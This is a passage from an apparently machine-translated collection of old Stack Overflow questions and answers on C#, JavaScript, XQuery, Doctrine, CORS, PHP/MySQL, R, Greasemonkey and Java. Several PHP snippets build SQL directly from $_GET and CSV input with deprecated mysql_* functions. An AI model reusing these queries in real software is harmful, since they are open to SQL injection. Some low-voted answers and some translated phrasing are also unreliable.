[AssetId("idObj", AssetIdProperty = "SubObj.id")]
public ActionResult index(IdObject idObj) {
    //code here
} 
```

`AssetIdAttribute`如下：

```
public class AssetIdAttribute : ActionFilterAttribute
{
    public string _assetIdParameterKey { get; set; }

    public string AssetIdProperty { get; set; }

    public AssetIdFilterAttribute(string assetIdParameterKey)
    {
        _assetIdParameterKey = assetIdParameterKey;
    }

    public override void OnActionExecuting(ActionExecutingContext filterContext)
    {
        int assetId;
        var param = filterContext.ActionParameters[_assetIdParameterKey];
        int.TryParse(GetPropertyValue(param, this.AssetIdProperty).ToString(), out assetId);
        //you code continues here.
    }

    private static string GetPropertyValue(object souce, string property)
    {
        var propNames = string.IsNullOrWhiteSpace(property) || !property.Contains('.') ? new string[] { } : property.Split('.');
        var result = souce;
        foreach (var prop in propNames)
        {
            result = result.GetType().GetProperty(prop).GetValue(result);
        }
        return result.ToString();
    }
} 
```

`ToString`该代码在调用时和调用时没有空检查`GetProperty`。此外，它不会检查`TryParse`. 请在使用时应用这些更正。

也许这段代码可以使用 编写`dynamic`，但最后`dynamic`使用反射编译成对象（就像我在这里所做的那样），因此对我来说没有太大区别。

此外，也许有一个像“idObj.SubObj.id”这样的参数会更清楚，但这又取决于偏好，代码会变得*有点*复杂。

# javascript - 构造函数和方法链与 JavaScript 中的超类

> ID：13537393
> 
> 赞同：0
> 
> 时间：2012-11-24T01:07:01.797
> 
> 标签：javascript, oop

我的代码有点麻烦。我了解方法链接和构造函数链接的概念，但无法使其正常工作。这是我到目前为止所拥有的：

```
function Set() {
    this.values = [];
}

Set.prototype.add = function() {
    for (i = 0; i < arguments.length; i++) {
        this.values.push(arguments[i]);
    }
}

var regSet = new Set();
regSet.add(10, 11, null);
console.log(regSet.values);  // → [10, 11, null];

function NonNullSet() {
    Set.apply(this, arguments);
}

NonNullSet.prototype = Object.create(Set.prototype);
NonNullSet.prototype.constructor = NonNullSet;

NonNullSet.prototype.add = function () {
    for (var i = 0; i < arguments.length; i++) {
        if (arguments[i] == null || arguments[i] == undefined) {
            throw new Error("Can't add null or undefined");
        }
    }

    return Set.prototype.add.apply(this, arguments);
}

var nonNull = new NonNullSet();
nonNull.add(10, 12, null);
console.log(nonNull.values);  // → undefined 
```

从上面的代码可以看出，nonNullSet 是 Set 的子类，我试图通过检查 null 或未定义的值来增加 add 方法。如果它们存在，则继续循环。如果它们是有效值，则调用 Set 超类的 add 方法，而不是重写它。

对我来说，这看起来是正确的，但我没有得到我想要的结果，所以有些事情是不对的。我在这里做错了什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-24T01:15:01.537

我看到两个问题：

*   `continue`跳到下一个循环迭代，但循环无论如何都不做任何事情，所以`continue`-ing 在它里面不会改变任何东西。相反，您实际上应该`Set.add`在循环内部调用，一次给它一个元素——但前提是该元素是非 - `null`。
*   `console.log(nonNullSet.values)`应该是`console.log(nonNull.values)`：`nonNullSet`是你的构造函数，`nonNull`是你的实例。

此外，不完全是*问题*，而是您应该改进的其他方面：

*   你应该大写`NonNullSet`。
*   在内部`Set.prototype.add`，您应该`i`使用`var`关键字创建一个局部变量。
*   您的变量名包含`null`，但不是检查无效性，而是检查虚假性。（`null`当然，这是虚假的，但其他一些事情也是如此。）我认为这有点令人困惑。

# xml - xquery 多个最大值

> ID：13537394
> 
> 赞同：2
> 
> 时间：2012-11-24T01:07:23.317
> 
> 标签：xml, xquery

如何返回 xquery 中的所有最大值？我使用了 max() 但它只给了我一个！谢谢。

```
<id>a</id>
<average>5</average>
<id>b</id>
<average>5</average>
<id>c</id>
<average>5</average>
<id>d</id>
<average>4</average>
<id>e</id>
<average>1</average> 
```

我希望我的结果是：

```
<id>a</id>
<id>b</id>
<id>c</id> 
```

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-24T02:12:31.130

**使用**：

```
/*/id[following-sibling::*[1]/number() eq max(/*/average)] 
```

以上是正确的 XQuery 和正确的 XPath 2.0 解决方案。

**使用 Saxon EE 9.3.04 XQuery 进行验证**：

当上述 XQUery 应用于以下 XML 文档（提供的片段，包装到单个顶部元素中以使其成为格式良好的 XML 文档）时：

```
<t>
    <id>a</id>
    <average>5</average>
    <id>b</id>
    <average>5</average>
    <id>c</id>
    <average>5</average>
    <id>d</id>
    <average>4</average>
    <id>e</id>
    <average>1</average>
</t> 
```

**产生了想要的正确结果**：

```
<?xml version="1.0" encoding="UTF-8"?><id>a</id><id>b</id><id>c</id> 
```

**当对同一个 XML 文档（上图）应用此 XSLT 2.0 转换（使用 Saxon 9.1.05）时**：

```
<xsl:stylesheet version="2.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
 <xsl:output omit-xml-declaration="yes" indent="yes"/>

 <xsl:template match="/">
  <xsl:sequence select=
   "/*/id[following-sibling::*[1]/number() eq max(/*/average)]"/>
 </xsl:template>
</xsl:stylesheet> 
```

**再次产生相同的正确结果：**

```
<id>a</id>
<id>b</id>
<id>c</id> 
```

# php - 在 Doctrine2 实体中存储“CASE WHEN”条件

> ID：13537398
> 
> 赞同：18
> 
> 时间：2012-11-24T01:09:05.633
> 
> 标签：php, mysql, symfony, doctrine-orm

从 Doctrine 2.1 开始，支持 CASE WHEN 语句，但没有很多关于它的文档。我的目标是设置一个布尔值来判断一张照片是否被用户收藏：

```
 ->addSelect("CASE WHEN f.photo is NULL THEN false ELSE true END as is_favorited")
       ->leftJoin("p.favorites", 'f', 'WITH', 'f.owner = :viewer')
       ->orderBy("p.date_posted", "DESC")
       ->setParameters(array("owner" => $owner, "viewer" => $viewer)); 
```

但是因为我的实体正在被 JMSSerializer 转换为 json，所以我想将 CASE WHEN 结果设置为实体的属性。

```
 ->addSelect("CASE WHEN f.photo is NULL THEN false ELSE true END as p.is_favorited") 
```

但不幸的是，Doctrine 似乎并不喜欢这样：

> [语法错误] 第 0 行，第 65 列：错误：预期的 Doctrine\ORM\Query\Lexer::T_FROM，得到 '.'

在实体上设置 DQL 创建的属性是否有替代方法？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-09-03T17:44:01.273

无法直接在查询中设置属性值。相反，您可以将未映射的字段添加到实体中，然后遍历结果并设置它。在这种情况下`JMSSerializer`，序列化该字段，您可以在其上设置必要的类型和其他元信息。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-12-19T20:41:51.150

你能试试这个。它将与 DQL 一起使用

```
->addSelect("SUM(CASE WHEN f.photo is NULL THEN 0 ELSE 1 END) as p.is_favorited"); 
```

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2015-02-05T16:29:56.437

从错误听起来像是在抱怨，因为您的选择语句中没有列出 FROM 表。

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2015-03-17T16:41:17.680

你只需要添加你的

```
->from() 
```

为“F”提供表名的行和

# javascript - 让 JSON 在 IE 中工作

> ID：13537401
> 
> 赞同：1
> 
> 时间：2012-11-24T01:10:13.730
> 
> 标签：javascript, jquery, ajax, json, getjson

我无法从 IE 中的 JSON 提要获取数据。

这是测试。它在 FF、Chrome、Safari 中发出警报，但在 IE 中没有：

```
function do_something(data){
    alert(data);
}

$(document).ready(function() {
    $.getJSON('https://www.mec.ca/api/v1/stores/1', do_something);
}); 
```

​这是小提琴：http: [//jsfiddle.net/upksp/](http://jsfiddle.net/upksp/)

对于看似相关的问题，我尝试了以下解决方案，但没有成功：

*   使用`$.ajax()`代替`$.getJSON()`：[$.getJSON 在 IE 中不起作用](https://stackoverflow.com/questions/10315211/getjson-not-workin-in-ie)
*   附加`&callback=?`：[$.getJson 在 IE 中不起作用](https://stackoverflow.com/questions/8448934/getjson-not-working-in-ie)

我不禁认为这可能是标题的问题，但对它们了解得不够多，无法诊断。我在同一页面上成功使用了 JSONP，没有任何问题，而且我没有看到任何冲突。帮助！

* * *

**注意：**对于我正在处理的代码，API 将与请求它的脚本位于同一域 (1)。但是对于测试，它们将具有不同的子域（2），例如*www.domain.com*与*environment.domain.com*。我假设（2）会有问题，但（1）会正常工作吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-24T01:25:43.703

由于浏览器安全原因，您不能从一个来源向另一个来源发出请求（例如 jsfiddle.net 到[www.mec.ca](http://www.mec.ca)）。近年来，浏览器开始使用 CORS（跨域资源共享）来规避这一点。这允许浏览器向另一个域发出请求，只要该服务器 ( [www.mec.ca](http://www.mec.ca) ) 配置为接受它们。您可以在响应标头中检查这一点。对于您的网址 ( [https://www.mec.ca/api/v1/stores/1](https://www.mec.ca/api/v1/stores/1) )，CORS 已启用。你可以在响应标题中看到这一行。`Access-Control-Allow-Origin: *`. 这意味着允许来自任何域的请求 (*)

```
HTTP/1.1 200 OK
Date: Sat, 24 Nov 2012 01:19:23 GMT
Server: Apache
Content-Language: en
Access-Control-Allow-Origin: *
X-Powered-By: Servlet/2.5 JSP/2.1
Vary: Accept-Encoding,User-Agent
Transfer-Encoding: chunked
Content-Type: application/json 
```

由于 IE 在实施 CORS 标准方面落后，直到 IE10 才加入 IE。因此，您的小提琴将无法在以前版本的 IE 中工作。

# html - HTML输入框多行

> ID：13537402
> 
> 赞同：0
> 
> 时间：2012-11-24T01:11:05.130
> 
> 标签：html

我有一个 HTML 表单

```
<form id="my_form" action="submit">
  Title: <input type="text" name="title"> 
</form> 
```

我希望标题输入框的高度超过一行，而不是一行。我该怎么做？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-24T01:14:35.423

简短的回答 - 你不能这样做。改为使用`<textarea>`。

# mysql - 在 PHP 中接收错误

> ID：13537410
> 
> 赞同：0
> 
> 时间：2012-11-24T01:13:11.627
> 
> 标签：mysql, cart, php, shopping

我在创建购物篮页面时遇到问题。每次我添加产品时，它都会向我显示已添加产品但不显示产品信息...

这是我的 basket.php 上的代码：

```
<?php

    $id = $_GET[BikeCode];   //the product id from the URL 
    $action     = $_GET[action]; //the action from the URL 

    //if there is an id and that id doesn't exist display an error message
    if($id && !productExists($id)) {
        die("Error. Product Doesn't Exist");
    }

    switch($action) {   //decide what to do 

        case "add":
            $_SESSION['cart'][$id]++; //add one to the quantity of the product with id $id 
        break;

        case "remove":
            $_SESSION['cart'][$id]--; //remove one from the quantity of the product with id $id 
            if($_SESSION['cart'][$id] == 0) unset($_SESSION['cart'][$id]); //if the quantity is zero, remove it completely (using the 'unset' function) - otherwise is will show zero, then -1, -2 etc when the user keeps removing items. 
        break;

        case "empty":
            unset($_SESSION['cart']); //unset the whole cart, i.e. empty the cart. 
        break;
    }

    if($_SESSION['cart']) {

        echo "<table width=\"100%\">";   

            foreach($_SESSION['cart'] as $id => $quantity) {    

              $sql = sprintf("SELECT Manufacturer, Model, Price FROM Bike WHERE BikeCode = $id;", $id); 

                $result = mysql_query($sql);

                if(mysql_num_rows($result) > 0) {

                    list($Manufacturer, $Model, $Price) = mysql_fetch_row($result);

                    $line_cost = $price * $quantity;        //work out the line cost
                    $total = $total + $line_cost;           //add to the total cost

                        echo "<tr><th>Manufacturer:</th><th>Model:</th><th>Price:</th></tr>";
                        echo "<tr>";
                        echo "<td align=\"center\">$Manufacturer</td>";
                        echo "<td align=\"center\">$Model</td>";
                        echo "<td align=\"center\">$Price</td>";
                    echo "</tr>";
                }
            }

            echo "<tr>";
                echo "<td colspan=\"2\" align=\"right\">Total</td>";
                echo "<td align=\"right\">£$total</td>";
            echo "</tr>";

            echo "<tr>";
                echo "<td colspan=\"3\" align=\"right\"><a href=\"$_SERVER[PHP_SELF]?action=empty\" onclick=\"return confirm('Are you sure?');\">Empty Cart</a></td>";
            echo "</tr>";       
        echo "</table>";

    }else{
        echo "You have no items in your shopping cart.";
    }

    function productExists($id) {
            $sql = "SELECT * FROM Bike WHERE BikeCode = $id";

            return mysql_num_rows(mysql_query($sql)) > 0;
    }
?> 
```

我相信错误来自代码中的这一部分，但我无法找出它是什么：

```
foreach($_SESSION['cart'] as $id => $quantity) {    

                  $sql = sprintf("SELECT Manufacturer, Model, Price FROM Bike WHERE BikeCode = $id;", $id); 

                    $result = mysql_query($sql);

                    if(mysql_num_rows($result) > 0) {

                        list($Manufacturer, $Model, $Price) = mysql_fetch_row($result);

                        $line_cost = $price * $quantity;        //work out the line cost
                        $total = $total + $line_cost;           //add to the total cost

                            echo "<tr><th>Manufacturer:</th><th>Model:</th><th>Price:</th></tr>";
                            echo "<tr>";
                            echo "<td align=\"center\">$Manufacturer</td>";
                            echo "<td align=\"center\">$Model</td>";
                            echo "<td align=\"center\">$Price</td>";
                        echo "</tr>";
                    }
                } 
```

帮助将不胜感激，并提前感谢您。

**编辑**

这显然是错误：

注意：使用未定义的常量 BikeCode - 在第 42 行的 /homes/2012/abpr904/html/velocity/basket.php 中假定为“BikeCode” 注意：未定义的索引：/homes/2012/abpr904/html/velocity/basket 中的 BikeCode。第 42 行的 php 注意：使用未定义的常量动作 - 在第 43 行的 /homes/2012/abpr904/html/velocity/basket.php 中假定为“动作” 注意：未定义的索引：/homes/2012/abpr904/html/ 中的动作第 43 行的 velocity/basket.php 警告：mysql_num_rows() 期望参数 1 是资源，布尔值在第 76 行的 /homes/2012/abpr904/html/velocity/basket.php 中给出 注意：未定义的变量：/homes/ 中的总数2012/abpr904/html/velocity/basket.php 第 94 行

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-24T01:17:39.450

```
$sql = sprintf("SELECT Manufacturer, Model, Price FROM Bike WHERE BikeCode = %d;", $id); 
```

您使用 sprintf 不正确。

但是您应该切换到[PDO](http://php.net/manual/en/book.pdo.php)并正确消毒。

Also, I assume you mean $id = $_GET['id'] or some constant identifier. It would be insane to assign a unique get param for each item.

# r - 如何找到按 2 个不同列分组的四分位数

> ID：13537416
> 
> 赞同：-2
> 
> 时间：2012-11-24T01:13:39.610
> 
> 标签：r, statistics, quantile

我有一个看起来像这样的数据集

```
year month age
2007 1     17
2007 1     18
2007 1     19
2007 1     30
2007 1     31
2007 2     18
2007 2     19
2007 2     30
2008 2     41
2008 2     52
2008 2     49  
2008 3     23
2008 3     19
2008 3     39 
```

而且我被困在试图按年和月找到四分位数组。

结果应该是这样的：

```
2007 1 Q1 Q2 Q3 Q4
2007 2 Q1 Q2 Q3 Q4 
```

ETC..

谢谢

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-24T01:26:17.747

聚合执行此操作。

```
> aggregate(.~year + month, data=age, FUN=fivenum)
  year month age.1 age.2 age.3 age.4 age.5
1 2007     1  17.0  18.0  19.0  30.0  31.0
2 2007     2  18.0  18.5  19.0  24.5  30.0
3 2008     2  41.0  45.0  49.0  50.5  52.0
4 2008     3  19.0  21.0  23.0  31.0  39.0

> dput(age)
structure(list(year = c(2007L, 2007L, 2007L, 2007L, 2007L, 2007L, 
2007L, 2007L, 2008L, 2008L, 2008L, 2008L, 2008L, 2008L), month = c(1L, 
1L, 1L, 1L, 1L, 2L, 2L, 2L, 2L, 2L, 2L, 3L, 3L, 3L), age = c(17L, 
18L, 19L, 30L, 31L, 18L, 19L, 30L, 41L, 52L, 49L, 23L, 19L, 39L
)), .Names = c("year", "month", "age"), class = "data.frame", row.names = c(NA, 
-14L)) 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-11-24T01:38:24.797

你的问题有点令人困惑。只需三个切点即可分成四分位数。那么在 Q1、Q2、Q3、Q4 列中，您真正想要的是什么？如果你想要计数，它似乎有点无聊。我将假设您想要最小值、25th.pctile、中值、75th.pctile 和最大值：

```
do.call ( rbind, with( dfrm, tapply(age, interaction(year=year , month=month), quantile, 
                                                           probs=c(0, .25,.5, 0.75, 1) ) ) )
#---------------------
       0%  25% 50%  75% 100%
2007.1 17 18.0  19 30.0   31
2007.2 18 18.5  19 24.5   30
2008.2 41 45.0  49 50.5   52
2008.3 19 21.0  23 31.0   39 
```

# php - 下拉菜单不显示任何选项

> ID：13537425
> 
> 赞同：1
> 
> 时间：2012-11-24T01:15:15.850
> 
> 标签：php, jquery, mysqli

我认为我没有正确编写下面的代码，但我希望能够从另一个页面上的模块下拉菜单中检索值。下面是包含空白下拉菜单并输出所选模块的编号和名称的代码：

```
$sql = "SELECT CourseId, CourseNo, CourseName FROM Course"; 

 $sqlstmt=$mysqli->prepare($sql);

 $sqlstmt->execute(); 

 $sqlstmt->bind_result($dbCourseId, $dbCourseNo, $dbCourseName);

 $courses = array(); // easier if you don't use generic names for data 

 $courseHTML = "";  
 $courseHTML .= '<select name="courses" id="coursesDrop" onchange="getModules();">'.PHP_EOL; 
 $courseHTML .= '<option value="">Please Select</option>'.PHP_EOL;  

 while($sqlstmt->fetch()) 
 { 
     $courseno = $dbCourseNo;
     $course = $dbCourseId;
     $coursename = $dbCourseName; 
     $courseHTML .= "<option value='".$course."'>" . $courseno . " - " . $coursename . "</option>".PHP_EOL;  
  } 

  $courseHTML .= '</select>'; 

    $moduleHTML = "";  
        $moduleHTML .= '<select name="modules" id="modulesDrop">'.PHP_EOL; 
        $moduleHTML .= '<option value="">Please Select</option>'.PHP_EOL;  
        $moduleHTML .= '</select>'; 

        ?>

        <script type="text/javascript">

        function getModules() { 
        var course = jQuery("#coursesDrop").val(); 
        jQuery('#modulesDrop').empty(); 
        jQuery('#modulesDrop').html('<option value="">Please Select</option>'); 
        jQuery.ajax({ 
        type: "post", 
        url:  "module.php", 
        data: { course:course }, 
        success: function(response){ 
        jQuery('#modulesDrop').append(response); 
        } 
        }); 

        }

        </script> 

    <?php

    if (isset($_POST['moduleSubmit'])) {    

    $outputmodule = ""; 

    $moduleInfo = explode("_", $_POST['modules']);
    $moduleId = $moduleInfo[0];
    $moduleNo = $moduleInfo[1];
    $moduleName = $moduleInfo[2];
    $outputmodule = sprintf("<p><strong>Module:</strong> %s - %s</p>", $moduleNo, $moduleName);

    ....

    ?> 
```

下面是 module.php 页面，它根据所选课程在下拉菜单中显示模块编号和名称：

```
<?php

$course = isset($_POST['course']) ? $_POST['course'] : ''; 

    $sql = "
    SELECT cm.CourseId, cm.ModuleId, c.CourseNo, m.ModuleNo,
    c.CourseName,
    m.ModuleName
    FROM Course c
    INNER JOIN Course_Module cm ON c.CourseId = cm.CourseId
    JOIN Module m ON cm.ModuleId = m.ModuleId
    WHERE
    (c.CourseId = ?)
    ORDER BY c.CourseId, m.ModuleId
    "; 

     $sqlstmt=$mysqli->prepare($sql);

     $sqlstmt->bind_param("s",$course);

     $sqlstmt->execute(); 

     $sqlstmt->bind_result($dbCourseId,$dbModuleId,$dbCourseNo,$dbModuleNo,$dbCourseName,$dbModuleName);

    $moduleHTML  = "";  

     while($sqlstmt->fetch()) { 
         $moduleHTML .= sprintf('<option value="%1$s">%2$s - %3$s</option>'.PHP_EOL, $dbModuleId, $dbModuleNo, $dbModuleName);
    } 

    echo $moduleHTML; 

     $sqlstmt->execute(); 
    ?> 
```

目前，除了“请选择”选项之外，下拉菜单中没有显示任何内容

更新：

好的，如果您查看 editsessionteacher.php 脚本，它包含以下有效的代码：

```
$outputmodule = ""; 

        $moduleInfo = explode("_", $_POST['modules']);
        $moduleId = $moduleInfo[0];
        $moduleName = $moduleInfo[2];
        $outputmodule = sprintf("<p><strong>Module:</strong> %s - %s</p>", $moduleId, $moduleName); 
```

module.php 是这样的：

```
$course = isset($_POST['course']) ? $_POST['course'] : ''; 

$sql = "
SELECT cm.CourseId, cm.ModuleId,
c.CourseName,
m.ModuleName
FROM Course c
INNER JOIN Course_Module cm ON c.CourseId = cm.CourseId
JOIN Module m ON cm.ModuleId = m.ModuleId
WHERE
(c.CourseId = ?)
ORDER BY c.CourseId, m.ModuleId
"; 

 $sqlstmt=$mysqli->prepare($sql);

 $sqlstmt->bind_param("s",$course);

 $sqlstmt->execute(); 

 $sqlstmt->bind_result($dbCourseId,$dbModuleId,$dbCourseName,$dbModuleName);

$moduleHTML  = "";  

     while($sqlstmt->fetch()) { 
         $moduleHTML .= sprintf('<option value="%1$s_%2$s">%1$s - %2$s</option>'.PHP_EOL, $dbModuleId, $dbModuleName);
    } 

echo $moduleHTML; 

 $sqlstmt->execute(); 
```

但是我想将 moduleNo 添加到下拉菜单中，所以当我尝试将代码更改为下面的代码时，它不起作用：

编辑sessionteacher.php：

```
$outputmodule = ""; 

$moduleInfo = explode("_", $_POST['modules']);
$moduleId = $moduleInfo[0];
$moduleNo = $moduleInfo[1];
$moduleName = $moduleInfo[2];
$outputmodule = sprintf("<p><strong>Module:</strong> %s - %s</p>", $moduleNo, $moduleName); 
```

模块.php：

```
 $course = isset($_POST['course']) ? $_POST['course'] : ''; 

    $sql = "
    SELECT cm.CourseId, cm.ModuleId, c.CourseNo, m.ModuleNo,
    c.CourseName,
    m.ModuleName
    FROM Course c
    INNER JOIN Course_Module cm ON c.CourseId = cm.CourseId
    JOIN Module m ON cm.ModuleId = m.ModuleId
    WHERE
    (c.CourseId = ?)
    ORDER BY c.CourseId, m.ModuleId
    "; 

     $sqlstmt=$mysqli->prepare($sql);

     $sqlstmt->bind_param("s",$course);

     $sqlstmt->execute(); 

     $sqlstmt->bind_result($dbCourseId,$dbModuleId,$dbCourseNo,$dbModuleNo,$dbCourseName,$dbModuleName);

    $moduleHTML  = "";  

$moduleHTML .= '<select name="modules" id="modulesDrop">'.PHP_EOL; 
$moduleHTML .= '<option value="">Please Select</option>'.PHP_EOL;  

 while($sqlstmt->fetch()) { 
     $moduleHTML .= sprintf('<option value="%1$s">%2$s - %3$s</option>'.PHP_EOL, $dbModuleId, $dbModuleNo, $dbModuleName);
} 

$moduleHTML .= '</select>'; 

echo $moduleHTML; 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-24T01:21:13.263

看来您从未调用`getModules()`会发出请求以获取新选项的 javascript 函数。尝试在你的`<script>`标签中添加这个：

```
jQuery(function(){
  jQuery("#coursesDrop").change(getModules); 

}) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-24T01:22:08.513

循环生成的字符串`while`应该在 `<select>...</select>`标签内

```
$moduleHTML .= '<select name="modules" id="modulesDrop">'.PHP_EOL; 
$moduleHTML .= '<option value="">Please Select</option>'.PHP_EOL;  

 while($sqlstmt->fetch()) { 
     $moduleHTML .= sprintf('<option value="%1$s">%2$s - %3$s</option>'.PHP_EOL, $dbModuleId, $dbModuleNo, $dbModuleName);
} 

$moduleHTML .= '</select>'; 

echo $moduleHTML; 
```

# jquery - 如何从greasemonkey页面事件中获取jQuery ajax调用

> ID：13537432
> 
> 赞同：2
> 
> 时间：2012-11-24T01:18:06.997
> 
> 标签：jquery, greasemonkey, jquery-get

我有一个 GM 脚本，它在页面上插入一个链接，然后在单击时添加一个事件侦听器。

然后运行一个函数，其中包含一些 jQuery.get 调用。然而，除非我使用 jQuery 的 unsafeWindow 版本，否则这些调用似乎不会触发。

```
function runMyFunc() {
    console.log('myFunc is called');

    $.get('index.php',function () {
        console.log('jQuery.get worked');
    });
}

$("#someHook").before('<a id="myLink">Link</a>');

$('#myLink').click(runMyFunc); 
```

以上将输出“myFunc is called”到控制台，但不会对 .get 做任何事情

我正在使用来自[http://code.jquery.com/jquery.js的 FF17 和 GM1.5，jQUery](http://code.jquery.com/jquery.js)

有没有比使用 unsafeWindow 更好的方法来让它工作？我在 GM 1.0 之前有这个工作并且有很多 $.get 我需要在我的脚本中进行更改，并非所有这些都是从同一场景中运行的

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-24T02:39:43.637

你的代码对我来说很好。 **为什么/**你认为`$.get`不工作？

请记住，`'jQuery.get worked'`如果使用`index.php`. 您是否检查了 Firebug ***Net***面板或*Wireshark*等以查看是否进行了 AJAX 调用？

无论如何，如果您安装此 Greasemonkey 脚本，您可以看到该代码正常工作，以及一些错误处理：

```
// ==UserScript==
// @name     _delme9h762
// @include  http://YOUR_SERVER.COM/YOUR_PATH/*
// @include  http://fiddle.jshell.net/ZqhRH/*
// @require  http://code.jquery.com/jquery.js
// @grant    GM_addStyle
// ==/UserScript==
/*- The @grant directive is needed to work around a design change
    introduced in GM 1.0\.   It restores the sandbox.
*/

function runMyFunc() {
    console.log('myFunc is called');

    $.get('index.php', function () {
        console.log ('jQuery.get worked');
    } )
    .error ( function (respObj) {
        console.log ("Error! ", respObj.status, respObj.statusText);
    } )
    .complete ( function (respObj) {
        console.log ("AJAX Complete. Status: ", respObj.status);
    } )
    ;
}

$("#someHook").before('<a id="myLink">Link</a>');

$('#myLink').click(runMyFunc); 
```

然后**访问[fiddle.jshell.net/ZqhRH/1/show/](http://fiddle.jshell.net/ZqhRH/1/show/)**。

请注意，控制台将显示：

> myFunc 称为
> 错误！404 未找到
> AJAX 完成。状态：404

在 jsFiddle 站点上，因为`index.php`那里不存在，但`$.get()`在其他方面工作正常。

# java - JAVA：正确访问静态方法

> ID：13537443
> 
> 赞同：8
> 
> 时间：2012-11-24T01:21:41.247
> 
> 标签：java, object, static

我是 JAVA 新手，我喜欢尝试并理解一切。

在 JAVA 中访问静态方法“hero.returnHp()”时，我有以下内容：

```
 hero Mike = new hero();

 Mike.returnHp(); 
```

程序运行良好，但我注意到 Eclipse 有一条警告说：“来自 hero 类型的静态方法应该以静态方式访问。” 当我接受自动修复时，它会更改“Mike.returnHp();” 到“hero.returnHp();”。

所以我有两个问题：

1）这样做有什么好处？

2）如果我创建了两个相同类型的对象，我将如何指定以静态方式访问时返回哪个对象？

谢谢！

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-11-24T01:42:38.727

我首先想指出关键字 static 的含义。

**静态变量**每个类只存在一次——也就是说，如果您使用静态变量创建一个类，那么该类的所有实例都将共享该一个变量。此外，如果它是一个公共静态变量，那么任何人都可以访问该变量而无需先创建该类的实例——他们只需调用 Hero.staticVariableName;

**静态方法/函数**是无状态的。也就是说，它们仅对传递给方法/函数的参数提供的信息 (1) 或 (2) 在静态变量（如上所示）中提供的信息或 (3) 硬编码到方法/函数中的信息（例如，您创建一个静态函数来返回“hello”——然后“hello”被硬编码到函数中）。

Eclipse 之所以希望您以静态方式访问静态方法，是因为它让您和后续程序员看到您正在访问的方法是静态的（这有助于防止错误）。该函数将以您执行的任何一种方式运行，但正确的方法是以静态方式访问静态函数。请记住，如果您调用静态方法，无论您从哪个实例变量调用它（Tim.returnHp、Jim.returnHp、Mike.returnHp 等等），您都将从 hero 类调用相同的函数，您将看到完全相同的函数行为，无论您从谁那里称呼它。

如果您创建了两个相同类型的对象，那么您不能指定在以静态方式访问时返回哪个对象；静态函数/方法将引用整个 Hero 类。

你能解释一下你正在尝试做什么，以便我们可以提供更具体的反馈吗？returnHp() 很可能不应该是静态的。

那是“返回生命值”吗？如果是，那么您不希望它是静态的，因为英雄拥有的生命值数量是英雄状态的一部分，而静态方法是无状态的。（将状态想象为当前状态——活着、死亡、受伤、攻击、防御、上述的某种组合等）我建议进入 Hero 类并将 returnHp 更改为非静态方法。

现在……我知道你没有问，但我想给你一些建议：

类名（例如 Hero）应该大写。实例变量名称（如 mike）应为小写。这是一种广泛接受的命名约定，它将增加代码的可读性。

杰夫

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-11-24T01:25:25.337

方法`static`是属于类但不属于对象的方法。在上面的示例中，您创建了一个`Mike`class对象`hero`。该方法`returnHp()`是`static`，并且属于`hero`类，而不是`hero`对象（例如`Mike`）。

当您`static`从对象引用方法时，您可能会收到 IDE 或编译器警告，因为它不应该与该对象相关联，而只能与它的类相关联。

根据方法名称，我猜它*不应该*是静态的。

```
class hero {
    private float hp;
    public float returnHp() { // Should NOT be "public static float ..."
        return hp;
    }
} 
```

关于类成员的[JavaDocs](http://docs.oracle.com/javase/tutorial/java/javaOO/classvars.html)`static`也对s进行了简要讨论。你可能想检查一下。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-24T01:24:38.680

1.  它是 JVM 规范的一部分。
2.  你不需要。静态方法在类的实例之间很常见，您的困惑源于认为它是实例方法。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-11-24T01:28:17.777

静态方法完全独立于类的任何实例。

考虑这可行，并且不会导致 NullPointerException：

```
 hero Mike = null;

 Mike.returnHp(); 
```

（顺便说一下，类名应该以大写开头，变量名应该小写）。

这是另一个简洁的示例：作为静态方法，`Thread.sleep`即使您尝试在另一个线程实例上调用它，它也总是使当前线程休眠。

静态方法应该通过类名调用，而不是通过实例调用，否则会很混乱，主要是因为*没有动态调度*，因为静态方法不能在子类中被覆盖：

```
 hero Tim = new superhero(); // superhero extends hero

 Tim.returnHp();  // still calls the method in hero, not in superhero 
```

您现在收到编译器*警告*，但很多人说这是一个设计错误，应该是一个*错误*。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-11-24T01:33:34.987

static 表示静态方式。使用静态的一个原因是您可以直接使用类访问它。这就是它的好处。这就是为什么 main 总是静态的。入口函数不需要先创建实例。其实如果你在谷歌搜索静态，并深入了解它。你会知道何时以及为什么使用静态。

# php - CSV数据拆分然后存入MySQL

> ID：13537450
> 
> 赞同：0
> 
> 时间：2012-11-24T01:22:27.493
> 
> 标签：php, mysql, csv, store

我正在尝试通过 PHP 将数据从 CSV 文件导入 MySql。

我有 2 个 csv 文件。一个如下所示：

[![](../Images/ec9386de331da8ccab4baded002fc2c9.png)](https://i.stack.imgur.com/Otw83.png)

我已成功将其插入到我的数据库中。我使用了以下代码：

```
 <?php 
require("config.php");

mysql_select_db("magic",$db_link); //select the table 

if ($_FILES[csv][size] > 0) {

    //get the csv file
    $file = $_FILES[csv][tmp_name];
    $handle = fopen($file,"r");

    //loop through the csv file and insert into database
    do {
        if ($data[0]) {
            mysql_query("INSERT INTO alvis_input (a_zone, a_address) VALUES
                (
                    '".addslashes($data[0])."',
                    '".addslashes($data[1])."'
                )
            ");
        }
    } while ($data = fgetcsv($handle,10000,",","'"));
    //

    //redirect
    header('Location: file_alvis.php?success=1'); die;

} 

